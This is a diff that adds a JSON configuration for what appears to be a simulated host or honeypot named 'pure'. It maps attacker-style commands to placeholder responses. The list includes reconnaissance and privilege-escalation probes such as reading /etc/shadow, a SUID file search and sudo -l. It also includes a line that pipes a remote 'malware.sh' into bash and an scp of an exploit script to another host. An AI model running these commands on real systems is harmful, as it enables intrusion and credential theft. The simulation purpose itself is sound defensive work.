@@ -1,0 +1,25 @@
+{
+  "name": "pure",
+  "ip": "172.25.0.108",
+  "port": 2222,
+  "commands": {
+    "whoami": "Simulated response for: whoami",
+    "hostname": "Simulated response for: hostname",
+    "uname -a": "Simulated response for: uname -a",
+    "id": "Simulated response for: id",
+    "cat /etc/passwd": "Simulated response for: cat /etc/passwd",
+    "cat /etc/shadow": "Simulated response for: cat /etc/shadow",
+    "netstat -tulnp": "Simulated response for: netstat -tulnp",
+    "ss -tulwn": "Simulated response for: ss -tulwn",
+    "ps aux": "Simulated response for: ps aux",
+    "top -b -n1": "Simulated response for: top -b -n1",
+    "ls -alh /home": "Simulated response for: ls -alh /home",
+    "find / -perm -4000 -type f 2>/dev/null": "Simulated response for: find / -perm -4000 -type f 2>/dev/null",
+    "sudo -l": "Simulated response for: sudo -l",
+    "crontab -l": "Simulated response for: crontab -l",
+    "history": "Simulated response for: history",
+    "curl http://172.25.0.200/malware.sh | bash": "Simulated response for: curl http://172.25.0.200/malware.sh | bash",
+    "scp exploit.sh user@172.25.0.201:/tmp/": "Simulated response for: scp exploit.sh user@172.25.0.201:/tmp/",
+    "exit": "Simulated response for: exit"
+  }
+}
